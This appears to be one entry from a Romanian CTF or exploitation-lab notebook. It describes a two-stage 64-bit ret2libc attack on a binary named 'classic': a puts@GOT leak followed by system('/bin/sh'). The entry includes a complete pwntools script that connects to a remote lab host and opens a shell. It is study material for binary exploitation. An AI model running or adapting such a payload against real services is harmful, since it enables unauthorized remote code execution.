19. classic — RET2LIBC CLASIC ÎN 2 ETAPE (64-bit): LEAK puts -> CALL system
===============================================================================
--- Context ---
Binar 64-bit, No PIE (adrese de gadgeturi fixe), No canary (sau nerelevant
pentru payload, fiindca nu se scrie peste el). O functie call_messager()
tipareste tot ce primeste ca parametru - folosita ca "puts manual" pentru
etapa de leak. ETAPA 1: ROP care apeleaza puts(puts@got) si revine in
call_messager() (sa nu crape, sa putem trimite etapa 2). ETAPA 2: calculam
baza libc din leak, apoi apelam system("/bin/sh") cu adresele reale din
libc-ul descarcat local (libc.so pus manual in folder).

--- Cod final (clasic_final_2.py) ---
from pwn import *

context.binary = './classic'
elf = ELF('./classic')
libc = ELF('./libc.so')

pop_rdi = p64(0x4011ab)
ret = p64(0x401016)

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
call_messager = elf.symbols['call_messager']

p = remote("10.213.0.102", 51107)

payload1 = b"A" * 0x88 + pop_rdi + p64(puts_got) + p64(puts_plt) + p64(call_messager)

p.recvuntil(b"something:")
p.sendline(payload1)

p.recvuntil(b"Message sent\n")

leaked = p.recvline().strip()
leaked_addr = u64(leaked.ljust(8, b"\x00"))
log.success(f"Adresa reala puts: {hex(leaked_addr)}")

libc.address = leaked_addr - libc.symbols['puts']
log.success(f"Baza libc: {hex(libc.address)}")

system_addr = libc.symbols['system']
binsh_addr = next(libc.search(b"/bin/sh\x00"))
log.info(f"system(): {hex(system_addr)} | /bin/sh: {hex(binsh_addr)}")

payload2 = b"A" * 0x88 + ret + pop_rdi + p64(binsh_addr) + p64(system_addr)

p.recvuntil(b"something:")
p.sendline(payload2)

p.clean()

log.success("Shell deschis! Poti tasta comenzi:")
p.interactive()

